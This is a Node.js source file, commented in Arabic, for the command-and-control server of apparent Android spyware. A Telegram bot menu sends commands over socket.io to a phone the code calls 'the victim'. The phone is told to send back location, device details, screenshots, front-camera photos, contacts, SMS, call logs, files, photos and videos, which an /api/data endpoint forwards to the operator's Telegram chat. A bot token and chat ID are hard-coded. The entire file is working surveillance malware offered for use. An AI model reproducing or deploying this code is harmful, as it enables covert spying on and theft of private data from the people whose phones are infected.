const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

// ==========================================
// 1. الإعدادات الأساسية
// ==========================================
const token = '8976550250:AAHR7uKjBNzlHgoiBxierxbknbCdrtM_YcQ';
const chatId = '8737619314'; // ايديك
const bot = new TelegramBot(token, { polling: true });

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

let currentAction = null;

// ==========================================
// 2. قوائم الأزرار
// ==========================================
const mainKeyboard = { reply_markup: { keyboard: [
    [{ text: '📇 بيانات شخصية' }, { text: '📁 سحب الملفات' }],
    [{ text: '🖼️ سحب الصور' }, { text: '🎬 سحب الفيديوهات' }],
    [{ text: '📍 الموقع' }, { text: '📱 معلومات الجهاز' }],
    [{ text: '📸 لقطة شاشة' }, { text: '📷 كاميرا أمامية' }],
    [{ text: '🔦 المصباح' }, { text: '📢 إشعار' }],
    [{ text: '⌖ الأجهزة المتصلة' }, { text: '⌖ عن لنا' }]
], resize_keyboard: true } };

const dataKeyboard = { reply_markup: { keyboard: [
    [{ text: '📇 جهات الاتصال' }, { text: '💬 سحب الرسائل' }],
    [{ text: '📞 سحب المكالمات' }, { text: '🔙 رجوع' }]
], resize_keyboard: true } };

const countKeyboard = { reply_markup: { keyboard: [
    [{ text: '5' }, { text: '10' }, { text: '20' }],
    [{ text: '50' }, { text: '100' }],
    [{ text: '🔙 رجوع' }]
], resize_keyboard: true, one_time_keyboard: true } };

// ==========================================
// 3. أوامر البوت
// ==========================================
bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, '⌖ اختر من القائمة:', mainKeyboard));

bot.on('message', (msg) => {
    const text = msg.text;
    const id = msg.chat.id;
    if (!text || text === '/start') return;

    if (text === '🔙 رجوع') {
        currentAction = null;
        return bot.sendMessage(id, 'القائمة الرئيسية:', mainKeyboard);
    }

    if (text === '⌖ عن لنا') return bot.sendMessage(id, '⌖ المطور: @king_1_4');
    if (text === '⌖ الأجهزة المتصلة') return bot.sendMessage(id, '⌖ لا تتوفر أجهزة متصلة ✖️');

    // القوائم
    if (text === '📇 بيانات شخصية') return bot.sendMessage(id, 'اختر:', dataKeyboard);
    
    // طلب العدد
    if (['📇 جهات الاتصال', '💬 سحب الرسائل', '📞 سحب المكالمات', '📁 سحب الملفات', '🖼️ سحب الصور', '🎬 سحب الفيديوهات'].includes(text)) {
        currentAction = text;
        return bot.sendMessage(id, 'اختر العدد (كل ملف فيه 50 سجل):', countKeyboard);
    }

    // تنفيذ الأزرار الفورية
    if (text === '📍 الموقع') {
        bot.sendMessage(id, '⏳ جاري طلب الموقع...');
        io.emit('command', { action: 'location' });
        return;
    }

    if (text === '📱 معلومات الجهاز') {
        bot.sendMessage(id, '⏳ جاري طلب معلومات الجهاز...');
        io.emit('command', { action: 'deviceinfo' });
        return;
    }

    if (text === '📸 لقطة شاشة') {
        bot.sendMessage(id, '⏳ جاري التقاط الشاشة...');
        io.emit('command', { action: 'screenshot' });
        return;
    }

    if (text === '📷 كاميرا أمامية') {
        bot.sendMessage(id, '⏳ جاري التقاط صورة...');
        io.emit('command', { action: 'camera' });
        return;
    }

    if (text === '🔦 المصباح') {
        io.emit('command', { action: 'torch' });
        bot.sendMessage(id, '🔦 تم إرسال الأمر');
        return;
    }

    if (text === '📢 إشعار') {
        io.emit('command', { action: 'notification' });
        bot.sendMessage(id, '📢 تم إرسال الإشعار');
        return;
    }

    // تنفيذ السحب حسب العدد
    if (['5', '10', '20', '50', '100'].includes(text) && currentAction) {
        let limit = parseInt(text);
        const action = currentAction;
        currentAction = null;
        
        io.emit('command', { action: action, limit: limit });
        bot.sendMessage(id, `⏳ تم إرسال الأمر للضحية لسحب ${limit} من ${action}...`);
        return;
    }
});

// ==========================================
// 4. استقبال البيانات من التطبيق (الضحية)
// ==========================================
app.post('/api/data', (req, res) => {
    const data = req.body;
    if (!data) return res.status(400).send('No data');

    if (data.type === 'location') {
        const { lat, lon } = data;
        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        bot.sendPhoto(chatId, `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=600x300&markers=color:red%7C${lat},${lon}`, { caption: `📍 الموقع:\n${mapUrl}` });
    } 
    else if (data.type === 'contacts' || data.type === 'sms' || data.type === 'calls') {
        const filePath = `./${data.type}_${Date.now()}.txt`;
        fs.writeFileSync(filePath, data.content);
        bot.sendDocument(chatId, filePath, { caption: `✅ تم استلام ${data.type}` }).then(() => fs.unlinkSync(filePath));
    }
    else if (data.type === 'deviceinfo') {
        bot.sendMessage(chatId, `📱 معلومات الجهاز:\n${data.content}`);
    }
    else if (data.type === 'screenshot' || data.type === 'camera') {
        const buffer = Buffer.from(data.content, 'base64');
        bot.sendPhoto(chatId, buffer, { caption: `📸 ${data.type}` });
    }

    res.send('OK');
});

// ==========================================
// 5. تشغيل السيرفر
// ==========================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[Server] Listening on port ${PORT}`);
});
